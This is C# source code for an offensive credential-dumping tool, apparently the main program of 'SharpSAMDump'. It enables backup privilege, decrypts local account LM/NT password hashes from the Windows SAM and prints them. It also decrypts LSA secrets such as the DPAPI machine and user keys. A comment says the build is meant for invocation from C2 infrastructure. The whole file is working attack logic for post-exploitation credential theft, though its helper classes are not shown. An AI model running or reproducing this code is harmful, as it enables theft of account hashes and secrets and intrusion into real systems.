using System;
using System.Security.Policy;

namespace SharpSAMDump
{
    public class Program
    {
        public static void Main(string[] args)
        {
#if DEBUG
            // no wrapping in debug mode so that exceptions are caught by the debugger
            SAMDump();
            LSADump();
#else
            // try-catch wrapped execution for invocations from C2
            SAMDumpIgnoringExceptions();
#endif
        }

        private static void SAMDumpIgnoringExceptions()
        {
            try
            {
                SAMDump();
                LSADump();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Console.WriteLine(ex.StackTrace);
            }
        }

        public static void SAMDump()
        {
            Privileges.EnablePrivilege(Privileges.SeBackupPrivilege);

            byte[] blankLM = Util.FromHexString("aad3b435b51404eeaad3b435b51404ee");
            byte[] blankNT = Util.FromHexString("31d6cfe0d16ae931b73c59d7e0c089c0");

            byte[] samKey = SAM.GetEncryptedPasswordEncryptionKey();
            byte[] bootKey = LSA.GetBootKey();
            byte[] passwordEncryptionKey = Crypto.UnprotectPasswordEncryptionKey(samKey, bootKey);

            foreach (SAMEntry entry in SAM.GetEntries())
            {
                byte[] lmHash = Crypto.UnprotectLMHash(passwordEncryptionKey, entry.EncryptedLMHash, entry.Rid);
                if (lmHash == null)
                {
                    lmHash = blankLM;
                }

                byte[] ntHash = Crypto.UnprotectNTHash(passwordEncryptionKey, entry.EncryptedNTHash, entry.Rid);
                if (ntHash == null)
                {
                    ntHash = blankNT;
                }

                Console.WriteLine($"{entry.AccountName}:{entry.Rid}:{Util.ToHexString(lmHash)}:{Util.ToHexString(ntHash)}:::");
            }
        }

        public static void LSADump() {
            byte[] bootKey = LSA.GetBootKey();
            byte[] encryptedLsaKey = LSA.GetEncryptedLSAKey();
            byte[] lsaKey = Crypto.UnprotectLSAKey(encryptedLsaKey, bootKey);

            foreach (LSASecret secret in LSA.GetEntries())
            {
                byte[] plaintext = Crypto.UnprotectLSASecret(secret.EncryptedSecret, lsaKey);
                DecryptedLSASecret blob = new DecryptedLSASecret(plaintext);

                switch(secret.Name)
                {
                    case "DPAPI_SYSTEM":
                        DPAPIBlob dpapi = new DPAPIBlob(blob.Data);
                        Console.WriteLine($"DPAPI.MachineKey:{Util.ToHexString(dpapi.MachineKey)}");
                        Console.WriteLine($"DPAPI.UserKey:{Util.ToHexString(dpapi.UserKey)}");
                        break;

                    case "$MACHINE.ACC":
                        

                    default:
                        Console.WriteLine($"{secret.Name}:{Util.ToHexString(blob.Data)}");
                        break;
                }
            }
        }
    }
}
